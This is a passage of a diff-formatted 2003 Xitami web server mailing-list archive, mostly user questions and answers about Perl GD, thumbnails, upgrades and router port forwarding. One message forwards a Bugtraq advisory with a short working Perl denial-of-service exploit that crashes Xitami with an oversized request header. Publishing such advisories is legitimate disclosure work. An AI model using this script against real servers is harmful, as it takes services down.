+/convert=\\$path\\small\\$img);
+
+If you are discarding the results then its pretty trivial to delete the 
+file once you have sent it....
+
+Francis
+
+-- 
+Your theory of a donut-shaped universe is intriguing, Homer.
+I may have to steal it.        -- Prof S. Hawking on the "Simpsons"
+
+
+
+From xitami@lists.xitami.org  Tue Dec 23 20:38:44 2003
+From: xitami@lists.xitami.org (Brad Smith)
+Date: Tue, 23 Dec 2003 15:38:44 -0500
+Subject: [Xitami] DG perl module
+In-Reply-To: <007c01c3c970$c7e3c8a0$0301a8c0@danlap>
+Message-ID: <3FE86184.22733.69EAAA4@localhost>
+
+If you don't mind me offering an alternative suggestion, I prefer to use 
+ImageMagick for graphic work.  You need to download the 
+ImageMagick library (available as an executable for Win32), then install 
+either imagemagick or perlmagick from PPM.  The module's name has 
+changed, and I can't remember what it is called now, but I do know it is 
+one of those.
+
+I found GD to be weak for my purposes, mainly to create graphs on 
+demand.  Now, I use ImageMagick and OLE to create the graphs.  
+
+Check out imagemagick.org.  In retrospect, I think the Win32 executable 
+also includes the perl module; so, you probably won't even need to 
+install it from PPM.
+
+Sincerely,
+Brad Smith
+
+
+
+
+On 23 Dec 2003 at 10:21, Daniel Nowlin wrote:
+
+> Well I uninstalled the GD package that I installed with ppm3 and installed
+> GD with ppm2.  I get the same result.  The GD package fails at line 139.
+> This is in the newfromjpeg subroutine on line 3.  This is the code that I am
+> using to call GD:
+> 
+>    $width = '96';
+>   $pic_tmp = newFromJpeg GD::Image("$pic_file[$count]");
+>   ($pic_imgW, $pic_imgH) = $pic_tmp->getBounds();
+>   $ratio = ($pic_imgW / $width);
+>   $height  = int($pic_imgH/$ratio);
+>   $FinalImg = new GD::Image($width,$height);
+> 
+> $FinalImg->copyResized($pic_tmp,0,0,0,0,$width,$height,$pic_imgW,$pic_imgH);
+> 
+>   binmode STDOUT;
+> 
+>   print "Content-type: image/jpeg; name=\"${file}_thumb\.jpg\"\n";
+>   print "Content-Disposition: inline;
+> filename=\"thumb_$pic_file[$count]\.jpg\"\n\n";
+>   print $FinalImg->jpeg;
+> 
+> What I am attempting is to have GD create a thumbnail image of a jpg
+> picture.  Any ideas will be welcomed.
+> Dan
+> 
+> ----- Original Message ----- 
+> From: "Daniel Nowlin" <nowlind@missouri.edu>
+> To: <xitami@lists.xitami.org>
+> Sent: Tuesday, December 23, 2003 10:04 AM
+> Subject: Re: [Xitami] DG perl module
+> 
+> 
+> > thanks for the info.  I will try to do an un-install and use ppm2.
+> > ----- Original Message ----- 
+> > From: "Francis Turner" <francis.turner@freesbee.fr>
+> > To: <xitami@lists.xitami.org>
+> > Sent: Tuesday, December 23, 2003 2:32 AM
+> > Subject: Re: [Xitami] DG perl module
+> >
+> >
+> > > Daniel Nowlin wrote:
+> > >
+> > > >Has anybody tried to install the perl module called GD?  If so how did
+> > you get it installed.  I am running ActiveState perl version 5.8 and I
+> have
+> > tried the ppm but it does not install.
+> > > >
+> > > >
+> > > Using Activestate perl 5.6.something I have had no problems at all with
+> > > installing GD and (getting it to run with Xitami)...  I'm pretty sure I
+> > > used the version 2 ppm rather than the ver 3 one that newer activestate
+> > > builds tend to make the default.
+> > >
+> > > Francis
+> > >
+> > > -- 
+> > > Your theory of a donut-shaped universe is intriguing, Homer.
+> > > I may have to steal it.        -- Prof S. Hawking on the "Simpsons"
+> > >
+> > >
+> > >
+> > > --
+> > > Xitami Users Mailing List -- For Xitami support
+> > > To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+> > >
+> >
+> >
+> > --
+> > Xitami Users Mailing List -- For Xitami support
+> > To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+> >
+> 
+> 
+> --
+> Xitami Users Mailing List -- For Xitami support
+> To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+> 
+
+
+
+From xitami@lists.xitami.org  Tue Dec 23 21:27:13 2003
+From: xitami@lists.xitami.org (Daniel Nowlin)
+Date: Tue, 23 Dec 2003 15:27:13 -0600
+Subject: [Xitami] DG perl module
+References: <3FE86184.22733.69EAAA4@localhost>
+Message-ID: <000801c3c99b$887c30a0$0301a8c0@danlap>
+
+Thanks, I am looking at it now.  Rather hard to find examples on how to
+create thumbs.  What I am wanting is to give the routine the JPG file and
+have it create the thumb and send it to the browser.  All of this in a perl
+CGI program.  I do not want it to save the thumb at all just create it and
+send it to the browser.  I do not know if this can be done but it is rather
+interesting to try.
+----- Original Message ----- 
+From: "Brad Smith" <mata@matatech.tzo.com>
+To: <xitami@lists.xitami.org>
+Sent: Tuesday, December 23, 2003 2:38 PM
+Subject: Re: [Xitami] DG perl module
+
+
+> If you don't mind me offering an alternative suggestion, I prefer to use
+> ImageMagick for graphic work.  You need to download the
+> ImageMagick library (available as an executable for Win32), then install
+> either imagemagick or perlmagick from PPM.  The module's name has
+> changed, and I can't remember what it is called now, but I do know it is
+> one of those.
+>
+> I found GD to be weak for my purposes, mainly to create graphs on
+> demand.  Now, I use ImageMagick and OLE to create the graphs.
+>
+> Check out imagemagick.org.  In retrospect, I think the Win32 executable
+> also includes the perl module; so, you probably won't even need to
+> install it from PPM.
+>
+> Sincerely,
+> Brad Smith
+>
+>
+>
+>
+> On 23 Dec 2003 at 10:21, Daniel Nowlin wrote:
+>
+> > Well I uninstalled the GD package that I installed with ppm3 and
+installed
+> > GD with ppm2.  I get the same result.  The GD package fails at line 139.
+> > This is in the newfromjpeg subroutine on line 3.  This is the code that
+I am
+> > using to call GD:
+> >
+> >    $width = '96';
+> >   $pic_tmp = newFromJpeg GD::Image("$pic_file[$count]");
+> >   ($pic_imgW, $pic_imgH) = $pic_tmp->getBounds();
+> >   $ratio = ($pic_imgW / $width);
+> >   $height  = int($pic_imgH/$ratio);
+> >   $FinalImg = new GD::Image($width,$height);
+> >
+> >
+$FinalImg->copyResized($pic_tmp,0,0,0,0,$width,$height,$pic_imgW,$pic_imgH);
+> >
+> >   binmode STDOUT;
+> >
+> >   print "Content-type: image/jpeg; name=\"${file}_thumb\.jpg\"\n";
+> >   print "Content-Disposition: inline;
+> > filename=\"thumb_$pic_file[$count]\.jpg\"\n\n";
+> >   print $FinalImg->jpeg;
+> >
+> > What I am attempting is to have GD create a thumbnail image of a jpg
+> > picture.  Any ideas will be welcomed.
+> > Dan
+> >
+> > ----- Original Message ----- 
+> > From: "Daniel Nowlin" <nowlind@missouri.edu>
+> > To: <xitami@lists.xitami.org>
+> > Sent: Tuesday, December 23, 2003 10:04 AM
+> > Subject: Re: [Xitami] DG perl module
+> >
+> >
+> > > thanks for the info.  I will try to do an un-install and use ppm2.
+> > > ----- Original Message ----- 
+> > > From: "Francis Turner" <francis.turner@freesbee.fr>
+> > > To: <xitami@lists.xitami.org>
+> > > Sent: Tuesday, December 23, 2003 2:32 AM
+> > > Subject: Re: [Xitami] DG perl module
+> > >
+> > >
+> > > > Daniel Nowlin wrote:
+> > > >
+> > > > >Has anybody tried to install the perl module called GD?  If so how
+did
+> > > you get it installed.  I am running ActiveState perl version 5.8 and I
+> > have
+> > > tried the ppm but it does not install.
+> > > > >
+> > > > >
+> > > > Using Activestate perl 5.6.something I have had no problems at all
+with
+> > > > installing GD and (getting it to run with Xitami)...  I'm pretty
+sure I
+> > > > used the version 2 ppm rather than the ver 3 one that newer
+activestate
+> > > > builds tend to make the default.
+> > > >
+> > > > Francis
+> > > >
+> > > > -- 
+> > > > Your theory of a donut-shaped universe is intriguing, Homer.
+> > > > I may have to steal it.        -- Prof S. Hawking on the "Simpsons"
+> > > >
+> > > >
+> > > >
+> > > > --
+> > > > Xitami Users Mailing List -- For Xitami support
+> > > > To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+> > > >
+> > >
+> > >
+> > > --
+> > > Xitami Users Mailing List -- For Xitami support
+> > > To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+> > >
+> >
+> >
+> > --
+> > Xitami Users Mailing List -- For Xitami support
+> > To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+> >
+>
+>
+>
+> --
+> Xitami Users Mailing List -- For Xitami support
+> To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+>
+
+
+From xitami@lists.xitami.org  Mon Dec 29 06:19:10 2003
+From: xitami@lists.xitami.org (WhiteShepherd)
+Date: Mon, 29 Dec 2003 01:19:10 -0500
+Subject: [Xitami] ASP.NET for Xitami?
+Message-ID: <3FEF810E.29569.284615D@localhost>
+
+Will ASP.NET run under Xitami or is that for IIS only?
+
+  gene
+
+From xitami@lists.xitami.org  Tue Dec 30 06:23:59 2003
+From: xitami@lists.xitami.org (Bob)
+Date: Tue, 30 Dec 2003 01:23:59 -0500
+Subject: [Xitami] 2.4d10
+Message-ID: <3FF119FF.8040007@comcast.net>
+
+Hi
+Been away from the list for a while. When did 2.4d10 come out and what 
+did it fix from 2.4d9? Also there seems to be no install or setup .exe 
+in the download so how do you install it?
+
+Thanks
+Bob
+
+From xitami@lists.xitami.org  Wed Dec 31 01:14:00 2003
+From: xitami@lists.xitami.org (Brian)
+Date: Tue, 30 Dec 2003 20:14:00 -0500
+Subject: [Xitami] FTP Aliases limited to 20 characters
+Message-ID: <000001c3cf3b$635e2440$0200a8c0@TiltRacLaptop>
+
+I noticed that FTP alias names are limited to 20 characters in the web =
+admin
+tool, but if you edit the file by hand longer names will work. (Although =
+the
+admin tool will truncate them) Is there any reason for this limitation? =
+Can
+I change it?
+
+Thanks,
+Brian
+
+
+
+From xitami@lists.xitami.org  Wed Dec 31 04:59:45 2003
+From: xitami@lists.xitami.org (Josh A)
+Date: Tue, 30 Dec 2003 21:59:45 -0700
+Subject: [Xitami] 2.4d10
+References: <3FF119FF.8040007@comcast.net>
+Message-ID: <007b01c3cf5a$e8db0560$6902a8c0@dev>
+
+2.4.d10 fixed the below vulnerability. No advice on the setup, as it is a
+mess now, I guessed my way through it, it worked, so I leave it alone now :)
+
+Josh
+
+
+-----Original Message-----
+From: Oliver Karow <Oliver.karow@gmx.de>
+To: bugtraq@securityfocus.com
+Date: Mon, 22 Sep 2003 14:28:05 +0200
+Subject: Denial of service vulnerability in Xitami Open Source Web Server
+
+Denial of service vulnerability in Xitami Open Source Web Server
+================================================================
+
+Date: 22.09.2003
+=====
+
+
+Affected Systems
+================
+
+The vulnerability was discovered on several versions (production and
+beta) of Xitami
+webserver for Windows NT:
+
+- Xitami 2.5B4 (bw3225b4.exe)
+- Xitami 2.5B4 (bs3225b4.exe)
+- Xitami 2.4D9 (bw3224d9.exe)
+
+I did no tests with the other versions and os/platforms (OS/2, Alpha,
+OpenVMS, Unix).
+Therefore I can't confirm that the vulnerability exists there.
+
+The Problem
+===========
+
+Xitami is a multiplatform open source web server and the flagship of
+iMatix.
+The services crashes when it receives a http get request (to a .shtm
+file) with
+a header field of >= 5154 bytes, followed by a ":".
+
+Xitami dies due to a Microsoft Visual C++ Runtime Error, an
+abnormal program termination inside XIWIN32.EXE has occurred.
+The message is *not* followed by any Win32 exception dialog.
+
+Vendor:
+=======
+
+iMatix was informed about the vulnerability on 04.09.2003 and 05.09.2003
+via email.
+Up to now, i did not receive an answer from iMatix :(
+
+You can visit the vendors webpage here:
+
+http://www.ximati.com
+http://www.imatix.com
+
+Other Notes
+===========
+Unlike some server crashes, the service process will *not* recover from
+the crash
+caused by the attack.
+
+Successful exploitation of this vulnerability will NOT be logged, as the
+service crashes.
+
+It seems also not to be clear, what the actual production and beta
+release
+versions are.
+At http://www.xitami.com/download.htm, the current production is 2.4d9
+and the current
+beta is 2.5b5.
+At the same time, at http://www.imatix.com/html/xitami/index2.htm, the
+current
+production is 2.5b4 and the current beta is 2.5b4?!?
+
+Author:
+=======
+Oliver Karow (oliver.karow[at]gmx.de)
+
+Exploitation
+============
+
+#!/usr/local/bin/perl
+#
+# Simple exploit for Imatix Xitami Webserver on Windows NT
+#
+# Sending a GET request for a *.shtm file with a header field of >= 5154
+bytes, followed by a ":",
+# will crash the service.
+#
+# Vulnerable versions:
+# - Xitami 2.5B4 (bw3225b4.exe)
+# - Xitami 2.5B4 (bs3225b4.exe)
+# - Xitami 2.4D9 (bw3224d9.exe)
+# - others?
+#
+# For legal purposes only !
+#
+# 22.09.2003 - Oliver Karow - oliver.karow[AT]gmx.de
+
+use IO::Socket;
+
+$ip="127.0.0.1";
+$port=80;
+
+$var="A" x 5157;
+
+$mySocket=IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>$ip,
+PeerPort=>$port, Timeout=>5);
+$mySocket->autoflush(1);
+  print $mySocket "GET /test.shtm HTTP/1.0\r\n".
+        $var.": */*\r\n\r\n";
+
+@answer=<$mySocket>;
+$length=@answer;
+if ($length==0){die "\nService killed!\n";}
+print @answer;
+
+
+--
+Xitami Users Mailing List -- For Xitami support
+To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+
+----- Original Message ----- 
+From: "Bob" <rs318@comcast.net>
+To: <xitami@lists.xitami.org>
+Sent: Monday, December 29, 2003 11:23 PM
+Subject: [Xitami] 2.4d10
+
+
+> Hi
+> Been away from the list for a while. When did 2.4d10 come out and what
+> did it fix from 2.4d9? Also there seems to be no install or setup .exe
+> in the download so how do you install it?
+>
+> Thanks
+> Bob
+>
+> --
+> Xitami Users Mailing List -- For Xitami support
+> To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+>
+
+
+
+From xitami@lists.xitami.org  Wed Dec 31 15:00:50 2003
+From: xitami@lists.xitami.org (Steven L. Haas)
+Date: Wed, 31 Dec 2003 09:00:50 -0600
+Subject: [Xitami] Running server through a router
+Message-ID: <BAY10-DAV52DsAeeUqq000079dc@hotmail.com>
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_0010_01C3CF7C.9671A370
+Content-Type: text/plain;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+I am trying to run the Xitami web server on my WIndows XP machine that =
+is connected to the internet via a cable modem (RoadRunner/Motorola =
+Surboard).  The internet connection is split amongst 2 computers using a =
+Linksys router.  When I start the web server everything seems fine, but =
+when I try to access the web page I have loaded on the server by =
+connecting to my internet connection's (cable modem) IP address, I am =
+directed to the router's configuration page.  This also happens when the =
+server is turned off, so it's not a big suprise.  What is odd is that =
+when I try to connect to the router's config page by entering the =
+router's default IP address into IE, I am not taken to the config page =
+as usual, but I'm instead directed to the web page I have installed on =
+the Xitami web server.  When the web server is turned off I go straight =
+to the config page as expected.  It seems like somehow the router's IP =
+is bouncing me back from the router to the computer with the server =
+installed, and the cable modem's (internet connection) IP is forwarding =
+straight to the router and never reaching the computer with the server =
+installed.  I assume this is a relatively simple fix for any of you that =
+are knowledgeable with networks, but I can't figure out what to do to =
+fix this & make it work with my set up.  I also cant run the server and =
+a file sharing program like KazaA or WinMX.  Is there a way to allow for =
+these programs and the server to all run together harmoniously?  Thanks =
+in advance for any help, and I apologize if this question has already =
+been beaten to death.
+
+Steve
+------=_NextPart_000_0010_01C3CF7C.9671A370
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD>
+<META http-equiv=3DContent-Type content=3D"text/html; =
+charset=3Diso-8859-1">
+<META content=3D"MSHTML 6.00.2800.1276" name=3DGENERATOR>
+<STYLE></STYLE>
+</HEAD>
+<BODY bgColor=3D#ffffff>
+<DIV><FONT face=3DArial size=3D2>I am trying to run the Xitami web =
+server on my=20
+WIndows XP machine that is connected to the internet via a cable modem=20
+(RoadRunner/Motorola Surboard).&nbsp; The internet connection is split =
+amongst 2=20
+computers using a Linksys router.&nbsp; When I start the web server =
+everything=20
+seems fine, but when I try to access the web page I have loaded on the =
+server by=20
+connecting to my internet connection's (cable modem) IP address, I am =
+directed=20
+to the router's configuration page.&nbsp; This also happens when the =
+server is=20
+turned off, so it's not a big suprise.&nbsp; What is odd is that when I =
+try to=20
+connect to the router's config page by entering the router's default IP =
+address=20
+into IE, I am not taken to the config page as usual, but I'm instead =
+directed to=20
+the web page I have installed on the Xitami web server.&nbsp; When the =
+web=20
+server is turned off I go straight to the config page as expected.&nbsp; =
+It=20
+seems like somehow the router's IP is bouncing me back from the router =
+to the=20
+computer with the server installed, and the cable modem's (internet =
+connection)=20
+IP is forwarding straight to the router and never reaching the computer =
+with the=20
+server installed.&nbsp; I assume this is a relatively&nbsp;simple fix =
+for any of=20
+you that are knowledgeable with networks, but I can't figure out what to =
+do to=20
+fix this&nbsp;&amp; make it work with my set up.&nbsp; I also cant run =
+the=20
+server and a file sharing program like KazaA or WinMX.&nbsp; Is there a =
+way to=20
+allow for these programs and the server to all run together =
+harmoniously?&nbsp;=20
+Thanks in advance for any help, and I apologize if this question has =
+already=20
+been beaten to death.</FONT></DIV>
+<DIV><FONT face=3DArial size=3D2></FONT>&nbsp;</DIV>
+<DIV><FONT face=3DArial size=3D2>Steve</FONT></DIV></BODY></HTML>
+
+------=_NextPart_000_0010_01C3CF7C.9671A370--
+
+From xitami@lists.xitami.org  Wed Dec 31 18:30:31 2003
+From: xitami@lists.xitami.org (Day Tooley)
+Date: Wed, 31 Dec 2003 10:30:31 -0800
+Subject: [Xitami] Running server through a router
+References: <BAY10-DAV52DsAeeUqq000079dc@hotmail.com>
+Message-ID: <004f01c3cfcc$2c462b60$56d1a2d1@esactive.easystreet.com>
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_004B_01C3CF89.1DFE2550
+Content-Type: text/plain;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: 7bit
+
+Looks like you will need to port-forward port 80 in your router to your
+Windows hosting machine.  Also, you will need to permanently assign an
+internal IP address to your hosting machine.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Day Tooley
+Webfoot@EasyStreet.com
+
+When the game is over, both the king and the pawn are put into the same box.
+
+
+  ----- Original Message ----- 
+  From: Steven L. Haas
+  To: xitami@lists.xitami.org
+  Sent: Wednesday, December 31, 2003 7:00 AM
+  Subject: [Xitami] Running server through a router
+
+
+  I am trying to run the Xitami web server on my WIndows XP machine that is
+connected to the internet via a cable modem (RoadRunner/Motorola Surboard).
+The internet connection is split amongst 2 computers using a Linksys router.
+When I start the web server everything seems fine, but when I try to access
+the web page I have loaded on the server by connecting to my internet
+connection's (cable modem) IP address, I am directed to the router's
+configuration page.  This also happens when the server is turned off, so
+it's not a big suprise.  What is odd is that when I try to connect to the
+router's config page by entering the router's default IP address into IE, I
+am not taken to the config page as usual, but I'm instead directed to the
+web page I have installed on the Xitami web server.  When the web server is
+turned off I go straight to the config page as expected.  It seems like
+somehow the router's IP is bouncing me back from the router to the computer
+with the server installed, and the cable modem's (internet connection) IP is
+forwarding straight to the router and never reaching the computer with the
+server installed.  I assume this is a relatively simple fix for any of you
+that are knowledgeable with networks, but I can't figure out what to do to
+fix this & make it work with my set up.  I also cant run the server and a
+file sharing program like KazaA or WinMX.  Is there a way to allow for these
+programs and the server to all run together harmoniously?  Thanks in advance
+for any help, and I apologize if this question has already been beaten to
+death.
+
+  Steve
+
+------=_NextPart_000_004B_01C3CF89.1DFE2550
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD>
+<META http-equiv=3DContent-Type content=3D"text/html; =
+charset=3Diso-8859-1">
+<META content=3D"MSHTML 6.00.2800.1276" name=3DGENERATOR>
+<STYLE></STYLE>
+</HEAD>
+<BODY bgColor=3D#ffffff>
+<DIV>
+<DIV><FONT face=3DArial size=3D2>Looks like you will need to =
+port-forward port 80 in=20
+your router to your Windows hosting machine.&nbsp; Also, you will need =
+to=20
+permanently assign an internal IP address to your hosting =
+machine.</FONT></DIV>
+<DIV><BR>~~~~~~~~~~~~~~~~~~~~~~~~~~~<BR>Day Tooley<BR><A=20
+href=3D"mailto:Webfoot@EasyStreet.com">Webfoot@EasyStreet.com</A></DIV></=
+DIV>
+<DIV>&nbsp;</DIV>
+<DIV>When the game is over, both the king and the pawn are put into the =
+same=20
+box.</DIV>
+<DIV>&nbsp;</DIV>
+<DIV>&nbsp;</DIV>
+<BLOCKQUOTE dir=3Dltr=20
+style=3D"PADDING-RIGHT: 0px; PADDING-LEFT: 5px; MARGIN-LEFT: 5px; =
+BORDER-LEFT: #000000 2px solid; MARGIN-RIGHT: 0px">
+  <DIV style=3D"FONT: 10pt arial">----- Original Message ----- </DIV>
+  <DIV=20
+  style=3D"BACKGROUND: #e4e4e4; FONT: 10pt arial; font-color: =
+black"><B>From:</B>=20
+  <A title=3Dslhaas99@hotmail.com =
+href=3D"mailto:slhaas99@hotmail.com">Steven L.=20
+  Haas</A> </DIV>
+  <DIV style=3D"FONT: 10pt arial"><B>To:</B> <A =
+title=3Dxitami@lists.xitami.org=20
+  href=3D"mailto:xitami@lists.xitami.org">xitami@lists.xitami.org</A> =
+</DIV>
+  <DIV style=3D"FONT: 10pt arial"><B>Sent:</B> Wednesday, December 31, =
+2003 7:00=20
+  AM</DIV>
+  <DIV style=3D"FONT: 10pt arial"><B>Subject:</B> [Xitami] Running =
+server through=20
+  a router</DIV>
+  <DIV><BR></DIV>
+  <DIV><FONT face=3DArial size=3D2>I am trying to run the Xitami web =
+server on my=20
+  WIndows XP machine that is connected to the internet via a cable modem =
+
+  (RoadRunner/Motorola Surboard).&nbsp; The internet connection is split =
+amongst=20
+  2 computers using a Linksys router.&nbsp; When I start the web server=20
+  everything seems fine, but when I try to access the web page I have =
+loaded on=20
+  the server by connecting to my internet connection's (cable modem) IP =
+address,=20
+  I am directed to the router's configuration page.&nbsp; This also =
+happens when=20
+  the server is turned off, so it's not a big suprise.&nbsp; What is odd =
+is that=20
+  when I try to connect to the router's config page by entering the =
+router's=20
+  default IP address into IE, I am not taken to the config page as =
+usual, but=20
+  I'm instead directed to the web page I have installed on the Xitami =
+web=20
+  server.&nbsp; When the web server is turned off I go straight to the =
+config=20
+  page as expected.&nbsp; It seems like somehow the router's IP is =
+bouncing me=20
+  back from the router to the computer with the server installed, and =
+the cable=20
+  modem's (internet connection) IP is forwarding straight to the router =
+and=20
+  never reaching the computer with the server installed.&nbsp; I assume =
+this is=20
+  a relatively&nbsp;simple fix for any of you that are knowledgeable =
+with=20
+  networks, but I can't figure out what to do to fix this&nbsp;&amp; =
+make it=20
+  work with my set up.&nbsp; I also cant run the server and a file =
+sharing=20
+  program like KazaA or WinMX.&nbsp; Is there a way to allow for these =
+programs=20
+  and the server to all run together harmoniously?&nbsp; Thanks in =
+advance for=20
+  any help, and I apologize if this question has already been beaten to=20
+  death.</FONT></DIV>
+  <DIV><FONT face=3DArial size=3D2></FONT>&nbsp;</DIV>
+  <DIV><FONT face=3DArial =
+size=3D2>Steve</FONT></DIV></BLOCKQUOTE></BODY></HTML>
+
+------=_NextPart_000_004B_01C3CF89.1DFE2550--
+
+
+From xitami@lists.xitami.org  Wed Dec 31 18:27:47 2003
+From: xitami@lists.xitami.org (Day Tooley)
+Date: Wed, 31 Dec 2003 10:27:47 -0800
+Subject: [Xitami] Running server through a router
+References: <BAY10-DAV52DsAeeUqq000079dc@hotmail.com>
+Message-ID: <002401c3cfcb$caa8b2b0$56d1a2d1@esactive.easystreet.com>
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_0020_01C3CF88.BC52F100
+Content-Type: text/plain;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: 7bit
+
+Looks like you will need to port-forward port 80 in your router to your
+Windows hosting machine.  Also, you will need to permanently assign an
+internal IP address to your hosting machine.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Day Tooley
+Webfoot@EasyStreet.com
+
+When the game is over, both the king and the pawn are put into the same box.
+
+
+  ----- Original Message ----- 
+  From: Steven L. Haas
+  To: xitami@lists.xitami.org
+  Sent: Wednesday, December 31, 2003 7:00 AM
+  Subject: [Xitami] Running server through a router
+
+
+  I am trying to run the Xitami web server on my WIndows XP machine that is
+connected to the internet via a cable modem (RoadRunner/Motorola Surboard).
+The internet connection is split amongst 2 computers using a Linksys router.
+When I start the web server everything seems fine, but when I try to access
+the web page I have loaded on the server by connecting to my internet
+connection's (cable modem) IP address, I am directed to the router's
+configuration page.  This also happens when the server is turned off, so
+it's not a big suprise.  What is odd is that when I try to connect to the
+router's config page by entering the router's default IP address into IE, I
+am not taken to the config page as usual, but I'm instead directed to the
+web page I have installed on the Xitami web server.  When the web server is
+turned off I go straight to the config page as expected.  It seems like
+somehow the router's IP is bouncing me back from the router to the computer
+with the server installed, and the cable modem's (internet connection) IP is
+forwarding straight to the router and never reaching the computer with the
+server installed.  I assume this is a relatively simple fix for any of you
+that are knowledgeable with networks, but I can't figure out what to do to
+fix this & make it work with my set up.  I also cant run the server and a
+file sharing program like KazaA or WinMX.  Is there a way to allow for these
+programs and the server to all run together harmoniously?  Thanks in advance
+for any help, and I apologize if this question has already been beaten to
+death.
+
+  Steve
+
+------=_NextPart_000_0020_01C3CF88.BC52F100
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD>
+<META http-equiv=3DContent-Type content=3D"text/html; =
+charset=3Diso-8859-1">
+<META content=3D"MSHTML 6.00.2800.1276" name=3DGENERATOR>
+<STYLE></STYLE>
+</HEAD>
+<BODY bgColor=3D#ffffff>
+<DIV><FONT face=3DArial size=3D2>Looks like you will need to =
+port-forward port 80 in=20
+your router to your Windows hosting machine.&nbsp; Also, you will need =
+to=20
+permanently assign an internal IP address to your hosting =
+machine.</FONT></DIV>
+<DIV><BR>~~~~~~~~~~~~~~~~~~~~~~~~~~~<BR>Day Tooley<BR><A=20
+href=3D"mailto:Webfoot@EasyStreet.com">Webfoot@EasyStreet.com</A></DIV>
+<DIV>&nbsp;</DIV>
+<DIV>When the game is over, both the king and the pawn are put into the =
+same=20
+box.</DIV>
+<DIV>&nbsp;</DIV>
+<DIV>&nbsp;</DIV>
+<BLOCKQUOTE dir=3Dltr=20
+style=3D"PADDING-RIGHT: 0px; PADDING-LEFT: 5px; MARGIN-LEFT: 5px; =
+BORDER-LEFT: #000000 2px solid; MARGIN-RIGHT: 0px">
+  <DIV style=3D"FONT: 10pt arial">----- Original Message ----- </DIV>
+  <DIV=20
+  style=3D"BACKGROUND: #e4e4e4; FONT: 10pt arial; font-color: =
+black"><B>From:</B>=20
+  <A title=3Dslhaas99@hotmail.com =
+href=3D"mailto:slhaas99@hotmail.com">Steven L.=20
+  Haas</A> </DIV>
+  <DIV style=3D"FONT: 10pt arial"><B>To:</B> <A =
+title=3Dxitami@lists.xitami.org=20
+  href=3D"mailto:xitami@lists.xitami.org">xitami@lists.xitami.org</A> =
+</DIV>
+  <DIV style=3D"FONT: 10pt arial"><B>Sent:</B> Wednesday, December 31, =
+2003 7:00=20
+  AM</DIV>
+  <DIV style=3D"FONT: 10pt arial"><B>Subject:</B> [Xitami] Running =
+server through=20
+  a router</DIV>
+  <DIV><BR></DIV>
+  <DIV><FONT face=3DArial size=3D2>I am trying to run the Xitami web =
+server on my=20
+  WIndows XP machine that is connected to the internet via a cable modem =
+
+  (RoadRunner/Motorola Surboard).&nbsp; The internet connection is split =
+amongst=20
+  2 computers using a Linksys router.&nbsp; When I start the web server=20
+  everything seems fine, but when I try to access the web page I have =
+loaded on=20
+  the server by connecting to my internet connection's (cable modem) IP =
+address,=20
+  I am directed to the router's configuration page.&nbsp; This also =
+happens when=20
+  the server is turned off, so it's not a big suprise.&nbsp; What is odd =
+is that=20
+  when I try to connect to the router's config page by entering the =
+router's=20
+  default IP address into IE, I am not taken to the config page as =
+usual, but=20
+  I'm instead directed to the web page I have installed on the Xitami =
+web=20
+  server.&nbsp; When the web server is turned off I go straight to the =
+config=20
+  page as expected.&nbsp; It seems like somehow the router's IP is =
+bouncing me=20
+  back from the router to the computer with the server installed, and =
+the cable=20
+  modem's (internet connection) IP is forwarding straight to the router =
+and=20
+  never reaching the computer with the server installed.&nbsp; I assume =
+this is=20
+  a relatively&nbsp;simple fix for any of you that are knowledgeable =
+with=20
+  networks, but I can't figure out what to do to fix this&nbsp;&amp; =
+make it=20
+  work with my set up.&nbsp; I also cant run the server and a file =
+sharing=20
+  program like KazaA or WinMX.&nbsp; Is there a way to allow for these =
+programs=20
+  and the server to all run together harmoniously?&nbsp; Thanks in =
+advance for=20
+  any help, and I apologize if this question has already been beaten to=20
+  death.</FONT></DIV>
+  <DIV><FONT face=3DArial size=3D2></FONT>&nbsp;</DIV>
+  <DIV><FONT face=3DArial =
+size=3D2>Steve</FONT></DIV></BLOCKQUOTE></BODY></HTML>
+
+------=_NextPart_000_0020_01C3CF88.BC52F100--
+
+
